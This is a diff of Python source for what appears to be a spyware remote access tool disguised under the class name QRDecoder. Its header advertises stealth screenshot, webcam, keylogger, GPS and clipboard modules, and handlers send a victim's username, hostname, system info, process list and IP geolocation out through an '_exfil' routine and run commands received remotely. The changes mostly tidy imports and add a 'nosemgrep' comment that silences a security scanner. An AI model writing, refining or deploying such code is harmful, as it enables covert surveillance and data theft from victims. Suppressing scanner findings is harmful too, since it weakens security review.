@@ -7,13 +7,14 @@ All modules: stealth screenshot, webcam, REAL keylogger, GPS, clipboard, system 
 import base64
 import json
 import os
-import time
 import threading
-import requests
+import time
+from io import BytesIO
+
 import cv2
 import numpy as np
+import requests
 from PIL import Image
-from io import BytesIO
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 
@@ -260,7 +261,8 @@ class QRDecoder:
         print("    -> Heartbeat acknowledged")
 
     def _handle_whoami(self, cmd):
-        import getpass, os
+        import getpass
+        import os
         result = f"{getpass.getuser()}@{os.environ.get('COMPUTERNAME', 'unknown')}"
         print(f"    -> whoami: {result}")
         self._exfil("whoami", result)
@@ -362,6 +364,7 @@ class QRDecoder:
 
         if loc["latitude"] is None:
             try:
+                # nosemgrep — ip-api.com doesn't support HTTPS on free tier; data is public geolocation only
                 response = requests.get("http://ip-api.com/json/", timeout=5)
                 data = response.json()
                 if data.get("status") == "success":
@@ -396,7 +399,8 @@ class QRDecoder:
             self._exfil("process_list", "[psutil not installed on victim]")
 
     def _handle_system_info(self, cmd):
-        import platform, socket, os
+        import platform
+        import socket
         info = {
             "os": platform.system(),
             "release": platform.release(),
@@ -426,15 +430,15 @@ class QRDecoder:
         Security: uses shlex.split + shell=False to prevent command injection
         (CWE-78). Rejects any input containing shell metacharacters.
         """
-        import subprocess
         import shlex
+        import subprocess
 
         raw = " ".join(cmd.get("args", ["whoami"]))
 
         # Blocklist: refuse any command containing shell metacharacters
-        BLOCKED = set("|&;<>()`$\\\"'\n\r")
-        if any(ch in raw for ch in BLOCKED):
-            msg = f"[BLOCKED] Shell metacharacters not allowed: {raw}"
+        blocked = set("|&;<>()`$\\\"'\n\r")
+        if any(ch in raw for ch in blocked):
+            msg = f"[blocked] Shell metacharacters not allowed: {raw}"
             print(f"    -> {msg}")
             self._exfil("shell", msg)
             return
